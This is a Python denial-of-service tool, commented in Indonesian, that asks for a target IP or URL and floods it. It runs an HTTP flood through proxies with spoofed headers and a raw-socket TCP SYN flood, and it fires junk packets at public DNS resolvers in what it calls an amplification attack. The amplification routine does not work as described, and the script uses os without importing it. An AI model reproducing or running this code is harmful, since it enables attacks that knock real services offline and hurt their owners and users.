import asyncio
import aiohttp
import socket
import random
import time
from scapy.all import *
from concurrent.futures import ThreadPoolExecutor

# [CONFIGURASI UTAMA]
THREADS = 1000         # Jumlah thread parallel
TIMEOUT = 10           # Timeout koneksi (detik)
MAX_RETRIES = 3        # Maksimal percobaan ulang
PROXY_FILE = "proxy.txt" # File proxy (format: ip:port)

class DDoSGenerator:
    def __init__(self):
        self.target_ip = None
        self.target_ports = [80, 443, 22]
        self.user_agents = []
        self.proxies = []
        self.running = True
        self.load_resources()
    
    def load_resources(self):
        """Muat sumber daya eksternal"""
        try:
            with open("user_agents.txt", "r") as f:
                self.user_agents = [line.strip() for line in f]
            
            with open(PROXY_FILE, "r") as f:
                self.proxies = [line.strip() for line in f]
            
            print(f"Loaded {len(self.user_agents)} user agents")
            print(f"Loaded {len(self.proxies)} proxies")
        
        except Exception as e:
            print(f"Error loading resources: {str(e)}")
            exit()

    async def http_flood(self):
        """Serangan Layer 7 Asynchronous"""
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Referer": f"http://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            "X-Forwarded-For": f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        }
        
        proxy = f"http://{random.choice(self.proxies)}" if self.proxies else None
        
        try:
            async with aiohttp.ClientSession() as session:
                while self.running:
                    try:
                        async with session.get(
                            url=self.target_ip,
                            headers=headers,
                            proxy=proxy,
                            timeout=TIMEOUT,
                            ssl=False
                        ) as response:
                            print(f"HTTP {response.status} | Via: {proxy}")
                    except:
                        pass
        except Exception as e:
            print(f"Connection error: {str(e)}")

    def tcp_flood(self):
        """Serangan Layer 4 menggunakan RAW Socket"""
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        while self.running:
            try:
                packet = IP(dst=self.target_ip)/TCP(
                    dport=random.choice(self.target_ports),
                    sport=random.randint(1024, 65535),
                    flags="S"
                )
                send(packet, verbose=0)
            except:
                pass

    def udp_amplification(self):
        """Teknik Amplifikasi DNS/NTP"""
        dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]
        payload = bytes.fromhex("01000001000000000000") + bytes(random.getrandbits(8) for _ in range(32))
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (random.choice(dns_servers), 53))
                sock.close()
            except:
                pass

    async def start_attack(self):
        """Mulai semua jenis serangan"""
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            loop = asyncio.get_event_loop()
            
            # HTTP Flood
            http_tasks = [self.http_flood() for _ in range(THREADS//2)]
            
            # TCP/UDP Flood
            executor.submit(self.tcp_flood)
            executor.submit(self.udp_amplification)
            
            await asyncio.gather(*http_tasks)

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""\
    ░█████╗░██████╗░██████╗░░██████╗
    ██╔══██╗██╔══██╗██╔══██╗██╔════╝
    ██║░░██║██║░░██║██║░░██║╚█████╗░
    ██║░░██║██║░░██║██║░░██║░╚═══██╗
    ╚█████╔╝██████╔╝██████╔╝██████╔╝
    ░╚════╝░╚═════╝░╚═════╝░╚═════╝░
    """)
    
    attacker = DDoSGenerator()
    attacker.target_ip = input("Target IP/URL: ")
    
    try:
        asyncio.run(attacker.start_attack())
    except KeyboardInterrupt:
        attacker.running = False
        print("\nSerangan dihentikan!")